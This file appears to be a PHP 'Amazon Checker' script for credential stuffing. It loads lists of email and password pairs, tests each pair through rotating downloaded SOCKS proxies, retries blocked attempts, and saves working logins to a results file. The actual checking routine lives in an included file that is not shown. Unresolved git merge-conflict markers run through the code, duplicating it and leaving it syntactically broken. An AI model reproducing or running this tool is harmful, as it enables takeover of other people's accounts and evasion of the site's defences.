<?php
error_reporting(0);
<<<<<<< HEAD
ini_set('display_errors', false);
ini_set('max_execution_time', false);
ini_set('memory_limit', '4G');
ignore_user_abort(true);
function simpen($str, $file)
{
    $h = fopen(__DIR__.'/results/'.$file, 'a');
    $ws = fwrite($h, $str);
    fclose($h);
    return $ws;
}
file_exists(__DIR__.'/results/sukses.txt') or file_put_contents(__DIR__.'/results/sukses.txt', '');
=======
ini_set('display_errors',false);
ini_set('max_execution_time',false);
ini_set('memory_limit','4G');
ignore_user_abort(true);
function simpen($str,$file){
	$h = fopen(__DIR__.'/results/'.$file,'a');
	$ws = fwrite($h,$str);
	fclose($h);
	return $ws;
}
file_exists(__DIR__.'/results/sukses.txt') or file_put_contents(__DIR__.'/results/sukses.txt','');
>>>>>>> ab49f339ee981bd89d75c62da87595e800346123
require __DIR__."/check.php";
require __DIR__."/System/socks.php";

print "Amazon Checker by RedAngel\n\n";
print "\n\n";
print "Downloading socks...";
<<<<<<< HEAD
$socks = array_merge(socker(), socker(), socker());
=======
$socks = array_merge(socker(),socker(),socker());
>>>>>>> ab49f339ee981bd89d75c62da87595e800346123
print "\n\nDownload completed !\n";


$s = scandir(__DIR__.'/Assets');
<<<<<<< HEAD
unset($s[0], $s[1]);
print "siap nebas ".implode(',', $s)." kleng\n\n";
$data = array();
foreach ($s as $q) {
    $data[] = explode("\n", file_get_contents(__DIR__.'/Assets/'.$q));
}
$csk = count($socks);
$sockpos = 0;
foreach ($data as $no => $a) {
    foreach ($a as $b) {
        $c = explode("|", $b);
        $d = checkerra(trim($c[1]), trim($c[2]), trim($socks[$sockpos++]));
        $zz = json_decode($d, true);
        if ($zz['error']==3) {
            simpen("a|".$c[1]."|".$c[2]."|".json_encode($d).PHP_EOL, 'rung_kecek.txt');
            while ($zz['error']==3) {
                $zz = json_decode(checkerra(trim($c[1]), trim($c[2]), trim($socks[$sockpos++])));
            }
        }
        if ($sockpos>=$csk) {
            print "sock habis, download sock...\n";
            $socks = array_merge(socker(), socker(), socker());
            print "download selesai...";
            $sockpos = 0;
        }
        if (strpos($d, "LIVE")!==false) {
            print "sukses $d";
            simpen(json_encode(array($c[1],$c[2],json_encode($d))).PHP_EOL, 'sukses.txt');
        } else {
            print "gagal $d";
        }
        simpen(json_encode(array($c[1],$c[2],json_encode($d))).PHP_EOL, 'logs.txt');
        print PHP_EOL;
    }
}
=======
unset($s[0],$s[1]);
print "siap nebas ".implode(',',$s)." kleng\n\n";
$data = array();
foreach($s as $q){
	$data[] = explode("\n",file_get_contents(__DIR__.'/Assets/'.$q));
}
$csk = count($socks);
$sockpos = 0;
foreach($data as $no => $a){
	foreach($a as $b){
		$c = explode("|",$b);
		$d = checkerra(trim($c[1]),trim($c[2]),trim($socks[$sockpos++]));
		$zz = json_decode($d,true);
		if($zz['error']==3){
			simpen("a|".$c[1]."|".$c[2]."|".json_encode($d).PHP_EOL,'rung_kecek.txt');
			while($zz['error']==3){
				$zz = json_decode(checkerra(trim($c[1]),trim($c[2]),trim($socks[$sockpos++])));
			}
		}
		if($sockpos>=$csk){
			print "sock habis, download sock...\n";
			$socks = array_merge(socker(),socker(),socker());
			print "download selesai...";
			$sockpos = 0;
		}
		if(strpos($d,"LIVE")!==false){
			print "sukses $d";
		simpen(json_encode(array($c[1],$c[2],json_encode($d))).PHP_EOL,'sukses.txt');	
		} else {
			print "gagal $d";
		}
		simpen(json_encode(array($c[1],$c[2],json_encode($d))).PHP_EOL,'logs.txt');
		print PHP_EOL;
	}
}


>>>>>>> ab49f339ee981bd89d75c62da87595e800346123
